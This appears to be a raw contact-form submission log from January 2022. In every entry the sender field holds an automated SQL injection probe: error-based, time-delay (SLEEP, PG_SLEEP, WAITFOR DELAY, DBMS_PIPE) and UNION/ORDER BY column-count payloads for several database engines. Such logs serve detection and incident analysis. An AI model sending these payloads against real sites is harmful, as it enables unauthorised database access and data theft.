+++ 2022-01-20 05:38:40 AM -- Email from: 1%' AND 7709=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (7709=7709) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND '%'=', -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:40 AM -- Email from: 1) AND 1274=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (1274=1274) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND (8350=8350, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:41 AM -- Email from: 1 AND 1274=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (1274=1274) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:41 AM -- Email from: 1 AND 1274=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (1274=1274) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)-- peyw, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:42 AM -- Email from: 1') AND 1274=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (1274=1274) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND ('IOhn'='IOhn, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:42 AM -- Email from: 1' AND 1274=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (1274=1274) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND 'rvDZ'='rvDZ, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:42 AM -- Email from: 1%' AND 1274=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (1274=1274) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND '%'=', -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:43 AM -- Email from: (SELECT 5823 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(5823=5823,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:43 AM -- Email from: (SELECT CONCAT(0x7176767071,(SELECT (ELT(6747=6747,1))),0x7171767171)), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:44 AM -- Email from: (SELECT (CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (7656=7656) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113))), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:44 AM -- Email from: (SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (3237=3237) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113)), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:45 AM -- Email from: 1);SELECT SLEEP(5)#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:45 AM -- Email from: 1;SELECT SLEEP(5)#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:46 AM -- Email from: 1');SELECT SLEEP(5)#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:46 AM -- Email from: 1';SELECT SLEEP(5)#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:46 AM -- Email from: 1%';SELECT SLEEP(5)#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:47 AM -- Email from: 1);SELECT PG_SLEEP(5)--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:47 AM -- Email from: 1;SELECT PG_SLEEP(5)--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:48 AM -- Email from: 1');SELECT PG_SLEEP(5)--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:48 AM -- Email from: 1';SELECT PG_SLEEP(5)--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:49 AM -- Email from: 1%';SELECT PG_SLEEP(5)--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:49 AM -- Email from: 1);WAITFOR DELAY '0:0:5'--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:50 AM -- Email from: 1;WAITFOR DELAY '0:0:5'--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:50 AM -- Email from: 1');WAITFOR DELAY '0:0:5'--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:50 AM -- Email from: 1';WAITFOR DELAY '0:0:5'--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:51 AM -- Email from: 1%';WAITFOR DELAY '0:0:5'--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:51 AM -- Email from: 1);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(88)||CHR(121)||CHR(99),5) FROM DUAL--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:52 AM -- Email from: 1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(88)||CHR(121)||CHR(99),5) FROM DUAL--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:52 AM -- Email from: 1');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(88)||CHR(121)||CHR(99),5) FROM DUAL--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:53 AM -- Email from: 1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(88)||CHR(121)||CHR(99),5) FROM DUAL--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:53 AM -- Email from: 1%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(88)||CHR(121)||CHR(99),5) FROM DUAL--, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:53 AM -- Email from: 1) AND SLEEP(5) AND (1130=1130, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:54 AM -- Email from: 1 AND SLEEP(5), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:54 AM -- Email from: 1 AND SLEEP(5)-- DbCa, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:55 AM -- Email from: 1') AND SLEEP(5) AND ('cEVu'='cEVu, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:55 AM -- Email from: 1' AND SLEEP(5) AND 'zHdX'='zHdX, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:56 AM -- Email from: 1%' AND SLEEP(5) AND '%'=', -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:56 AM -- Email from: 1) AND 4413=(SELECT 4413 FROM PG_SLEEP(5)) AND (5294=5294, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:56 AM -- Email from: 1 AND 4413=(SELECT 4413 FROM PG_SLEEP(5)), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:57 AM -- Email from: 1 AND 4413=(SELECT 4413 FROM PG_SLEEP(5))-- ciem, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:57 AM -- Email from: 1') AND 4413=(SELECT 4413 FROM PG_SLEEP(5)) AND ('Pqbd'='Pqbd, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:58 AM -- Email from: 1' AND 4413=(SELECT 4413 FROM PG_SLEEP(5)) AND 'wDXb'='wDXb, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:58 AM -- Email from: 1%' AND 4413=(SELECT 4413 FROM PG_SLEEP(5)) AND '%'=', -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:59 AM -- Email from: 1) WAITFOR DELAY '0:0:5' AND (3722=3722, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:38:59 AM -- Email from: 1 WAITFOR DELAY '0:0:5', -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:00 AM -- Email from: 1 WAITFOR DELAY '0:0:5'-- zpur, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:00 AM -- Email from: 1') WAITFOR DELAY '0:0:5' AND ('mDDs'='mDDs, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:00 AM -- Email from: 1' WAITFOR DELAY '0:0:5' AND 'OwNP'='OwNP, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:01 AM -- Email from: 1%' WAITFOR DELAY '0:0:5' AND '%'=', -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:01 AM -- Email from: 1) AND 3181=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(71)||CHR(69)||CHR(75),5) AND (4918=4918, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:02 AM -- Email from: 1 AND 3181=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(71)||CHR(69)||CHR(75),5), -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:02 AM -- Email from: 1 AND 3181=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(71)||CHR(69)||CHR(75),5)-- JPoy, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:03 AM -- Email from: 1') AND 3181=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(71)||CHR(69)||CHR(75),5) AND ('jnKN'='jnKN, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:03 AM -- Email from: 1' AND 3181=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(71)||CHR(69)||CHR(75),5) AND 'Tpje'='Tpje, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:03 AM -- Email from: 1%' AND 3181=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(71)||CHR(69)||CHR(75),5) AND '%'=', -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:04 AM -- Email from: 1) ORDER BY 1-- PByo, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:04 AM -- Email from: 1) ORDER BY 3863-- bnfS, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:05 AM -- Email from: 1) UNION ALL SELECT NULL-- LnYp, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:05 AM -- Email from: 1) UNION ALL SELECT NULL,NULL-- WrNq, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:06 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL-- VIGl, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:06 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL-- rTGe, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:07 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ZhDn, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:07 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- xJTh, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:07 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TAWp, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:08 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- WoLz, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:08 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- xnzk, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:09 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QheA, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:09 AM -- Email from: 1 ORDER BY 1-- Nniy, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:10 AM -- Email from: 1 ORDER BY 2833-- tNqo, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:10 AM -- Email from: 1 UNION ALL SELECT NULL-- FEPh, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:10 AM -- Email from: 1 UNION ALL SELECT NULL,NULL-- MzDQ, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:11 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL-- fZDe, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:11 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL-- HQhK, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:12 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- wupN, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:12 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- LueY, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:13 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- knRv, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:13 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- lPJA, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:13 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- opHD, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:14 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HwAt, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:14 AM -- Email from: 1 ORDER BY 1-- pYTn, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:15 AM -- Email from: 1 ORDER BY 4991-- nQwM, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:15 AM -- Email from: 1 UNION ALL SELECT NULL-- YbrR, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:16 AM -- Email from: 1 UNION ALL SELECT NULL,NULL-- fAfG, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:16 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL-- EZzC, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:16 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL-- sUKI, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:17 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- yXsP, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:17 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- bVdB, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:18 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dsyL, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:18 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ltlX, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:19 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hyon, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:19 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZOYj, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:19 AM -- Email from: 1') ORDER BY 1-- OyOt, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:20 AM -- Email from: 1') ORDER BY 5826-- hHXF, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:21 AM -- Email from: 1') UNION ALL SELECT NULL-- rIqb, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:21 AM -- Email from: 1') UNION ALL SELECT NULL,NULL-- QmcB, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:22 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL-- IByw, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:22 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL-- WYzY, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:23 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- YoLa, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:23 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- EgOM, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:24 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wXFp, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:24 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DdpJ, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:24 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- MqBQ, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:25 AM -- Email from: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HBck, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:25 AM -- Email from: 1' ORDER BY 1-- NjnZ, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:26 AM -- Email from: 1' ORDER BY 4246-- Lrgj, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:26 AM -- Email from: 1' UNION ALL SELECT NULL-- dcOs, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:27 AM -- Email from: 1' UNION ALL SELECT NULL,NULL-- YAub, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:27 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL-- Knzb, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:27 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL-- gwxp, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:28 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- UrLJ, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:28 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- mDsO, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:29 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Vgvx, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:29 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vQKw, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:30 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vCfJ, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:30 AM -- Email from: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- fTtc, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:30 AM -- Email from: 1%' ORDER BY 1-- vPRm, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:31 AM -- Email from: 1%' ORDER BY 3884-- jrPa, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:31 AM -- Email from: 1%' UNION ALL SELECT NULL-- loNk, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:32 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL-- lQjl, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:32 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL-- Iyzl, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:33 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- WdPp, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:33 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- RfQA, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:33 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ZgQO, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:34 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KJOi, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:34 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- SxDL, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:35 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dFKt, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:35 AM -- Email from: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- llUP, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:36 AM -- Email from: 1) ORDER BY 1#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:36 AM -- Email from: 1) ORDER BY 2851#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:36 AM -- Email from: 1) UNION ALL SELECT NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:37 AM -- Email from: 1) UNION ALL SELECT NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:37 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:38 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:38 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:39 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:39 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:39 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:41 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:42 AM -- Email from: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:42 AM -- Email from: 1 ORDER BY 1#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:43 AM -- Email from: 1 ORDER BY 7426#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:43 AM -- Email from: 1 UNION ALL SELECT NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:44 AM -- Email from: 1 UNION ALL SELECT NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:44 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:44 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:45 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:45 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:46 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:46 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:47 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:47 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:47 AM -- Email from: 1 ORDER BY 1#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:48 AM -- Email from: 1 ORDER BY 8712#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:48 AM -- Email from: 1 UNION ALL SELECT NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:49 AM -- Email from: 1 UNION ALL SELECT NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:49 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:50 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:50 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:50 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:51 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:51 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:52 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:52 AM -- Email from: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- subject: 1, -- email: 1, -- Message is: 
+++ 2022-01-20 05:39:53 AM -- Email from: 1') ORDER BY 1#, -- subject: 1, -- email: 1, -- Message is: 
